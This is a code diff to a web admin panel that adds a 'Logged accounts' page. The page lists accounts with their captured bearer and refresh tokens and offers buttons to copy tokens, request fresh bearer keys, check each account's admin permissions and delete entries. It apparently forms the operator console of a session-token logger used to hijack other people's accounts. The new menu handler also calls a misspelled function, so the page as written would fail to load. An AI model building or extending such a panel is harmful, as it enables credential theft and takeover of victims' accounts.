@@ -243,9 +243,9 @@ main {
       </div>
     </div>
 
-    <div class="menu">Headers
+    <div class="menu">Logs
       <div class="dropdown">
-        <a data-page="xp-headers">XP Headers</a>
+        <a data-page="logger">Logged accounts</a>
       </div>
     </div>
   </nav>
@@ -373,7 +373,222 @@ async function showUserKeys() {
     </div>
   `);
 }
+/* ---------- Logger Page ---------- */
+async function showLogger() {
+  const data = await fetchJSON(`${API}/api/user/admin/validated`);
+  const entries = data || {};
 
+  let html = `
+    <div class="panel">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
+        <h3 style="margin:0;display:flex;align-items:center;gap:10px;">
+          Logged Accounts
+          <button class="refresh-btn" onclick="showLogger()">Refresh</button>
+        </h3>
+      </div>
+  `;
+
+  const keys = Object.keys(entries);
+  if (keys.length === 0) {
+    html += `<div class="keycard"><i>No logged accounts found.</i></div>`;
+  } else {
+    for (const [key, entry] of Object.entries(entries)) {
+      const bearerShort = entry.bearerToken 
+        ? entry.bearerToken.slice(0, 30) + "..." 
+        : "<i>Not captured</i>";
+      const refreshShort = entry.refreshToken 
+        ? entry.refreshToken.slice(0, 30) + "..." 
+        : "<i>Not captured</i>";
+      
+      const bearerUpdated = entry.bearerUpdatedAt 
+        ? timeAgo(entry.bearerUpdatedAt) 
+        : (entry.lastSeen ? timeAgo(entry.lastSeen) : "unknown");
+      
+      const adminPerms = entry.adminPerms === true 
+        ? '<span style="color:var(--green);font-weight:bold;">TRUE</span>' 
+        : entry.adminPerms === false 
+          ? '<span style="color:var(--red);font-weight:bold;">FALSE</span>'
+          : '<span style="opacity:0.6;">Unknown</span>';
+      
+      const adminChecked = entry.adminCheckedAt 
+        ? timeAgo(entry.adminCheckedAt) 
+        : "Never";
+      
+      const noteVal = entry.note ? entry.note.replace(/"/g, '&quot;') : "";
+      
+      html += `
+        <div class="keycard" id="logger-card-${key.replace(/[^a-zA-Z0-9]/g, '_')}">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;">
+            <b style="font-size:15px;">${key}</b>
+            <input type="text" placeholder="Add note..." value="${noteVal}" 
+              style="width:180px;padding:4px 8px;border-radius:4px;border:1px solid var(--border);background:var(--bg);color:var(--fg);font-size:12px;"
+              onchange="setLoggerNote('${key}', this.value)">
+          </div>
+          
+          <div style="margin-bottom:6px;">
+            <span style="opacity:0.7;">Bearer:</span> 
+            <span style="font-size:12px;word-break:break-all;">${bearerShort}</span>
+            <button class="copybtn" onclick="copyLoggerToken('${key}', 'bearer')" style="margin-left:6px;">Copy</button>
+            <span style="opacity:0.6;font-size:11px;margin-left:8px;">(Updated: ${bearerUpdated})</span>
+          </div>
+          
+          <div style="margin-bottom:6px;">
+            <span style="opacity:0.7;">Refresh:</span> 
+            <span style="font-size:12px;word-break:break-all;">${refreshShort}</span>
+            <button class="copybtn" onclick="copyLoggerToken('${key}', 'refresh')" style="margin-left:6px;">Copy</button>
+          </div>
+          
+          <div style="margin-bottom:10px;">
+            <span style="opacity:0.7;">Admin Perms:</span> ${adminPerms}
+            <span style="opacity:0.6;font-size:11px;margin-left:8px;">(Checked: ${adminChecked})</span>
+          </div>
+          
+          <div style="display:flex;gap:8px;flex-wrap:wrap;">
+            <button onclick="loggerRefreshBearer('${key}')" 
+              style="background:var(--accent);color:#000;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:600;font-size:13px;">
+              Request Bearer Key
+            </button>
+            <button onclick="loggerCheckAdmin('${key}')" 
+              style="background:#3b82f6;color:#fff;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:600;font-size:13px;">
+              Check Admin Perms
+            </button>
+            <button onclick="loggerDelete('${key}')" 
+              style="background:var(--red);color:#fff;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:600;font-size:13px;">
+              Delete Logged Account
+            </button>
+          </div>
+          
+          <div style="margin-top:8px;opacity:0.5;font-size:11px;">
+            First seen: ${entry.firstSeen ? new Date(entry.firstSeen).toLocaleString() : "unknown"}
+          </div>
+        </div>
+      `;
+    }
+  }
+
+  html += `</div>`;
+  show(html);
+}
+
+/* ---------- Logger Actions ---------- */
+async function copyLoggerToken(key, type) {
+  try {
+    const data = await fetchJSON(`${API}/api/user/admin/validated`);
+    const entry = data && data[key];
+    if (!entry) {
+      notify(`Entry not found for ${key}`, false);
+      return;
+    }
+    
+    const token = type === 'bearer' ? entry.bearerToken : entry.refreshToken;
+    if (!token) {
+      notify(`No ${type} token found for ${key}`, false);
+      return;
+    }
+    
+    await navigator.clipboard.writeText(token);
+    notify(`Copied ${type} token for ${key}`, true);
+  } catch (e) {
+    console.error(e);
+    notify(`Failed to copy ${type} token`, false);
+  }
+}
+
+async function setLoggerNote(key, note) {
+  try {
+    const res = await fetch(`${API}/api/user/admin/validated/set-note`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "admin-token": ADMIN_TOKEN
+      },
+      body: JSON.stringify({ key, note })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      notify(`Note saved for ${key}`, true);
+    } else {
+      notify(`Failed to save note: ${data.error}`, false);
+    }
+  } catch (e) {
+    console.error(e);
+    notify(`Failed to save note`, false);
+  }
+}
+
+async function loggerRefreshBearer(key) {
+  notify(`Requesting bearer for ${key}...`, true);
+  try {
+    const res = await fetch(`${API}/api/user/admin/validated/refresh-bearer`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "admin-token": ADMIN_TOKEN
+      },
+      body: JSON.stringify({ key })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      notify(`✅ Bearer refreshed for ${key}`, true);
+      showLogger(); // Refresh the page
+    } else {
+      notify(`❌ Failed: ${data.error}${data.details ? ' - ' + JSON.stringify(data.details) : ''}`, false);
+    }
+  } catch (e) {
+    console.error(e);
+    notify(`❌ Request failed: ${e.message}`, false);
+  }
+}
+
+async function loggerCheckAdmin(key) {
+  notify(`Checking admin perms for ${key}...`, true);
+  try {
+    const res = await fetch(`${API}/api/user/admin/validated/check-admin`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "admin-token": ADMIN_TOKEN
+      },
+      body: JSON.stringify({ key })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      const permText = data.adminPerms ? "TRUE ✅" : "FALSE ❌";
+      notify(`Admin perms for ${key}: ${permText} (status: ${data.status})`, true);
+      showLogger(); // Refresh the page
+    } else {
+      notify(`❌ Failed: ${data.error}`, false);
+    }
+  } catch (e) {
+    console.error(e);
+    notify(`❌ Request failed: ${e.message}`, false);
+  }
+}
+
+async function loggerDelete(key) {
+  if (!confirm(`Are you sure you want to delete all logged data for ${key}?`)) return;
+  
+  try {
+    const res = await fetch(`${API}/api/user/admin/validated/delete`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "admin-token": ADMIN_TOKEN
+      },
+      body: JSON.stringify({ key })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      notify(`✅ Deleted ${key}`, true);
+      showLogger(); // Refresh the page
+    } else {
+      notify(`❌ Failed: ${data.error}`, false);
+    }
+  } catch (e) {
+    console.error(e);
+    notify(`❌ Delete failed: ${e.message}`, false);
+  }
+}
 async function showUserList() {
   // Fetch all players using pagination to avoid memory issues
   let allPlayers = {};
@@ -681,7 +896,7 @@ document.querySelectorAll(".dropdown a").forEach(a=>{
     if(id==="user-keys")showUserKeys();
     if(id==="user-cmds")showUserCmds();
     if(id==="user-list")showUserList();
-    if(id==="xp-headers")showXpHeaders();
+    if(id==="logger")showlogger();
   };
 });
 
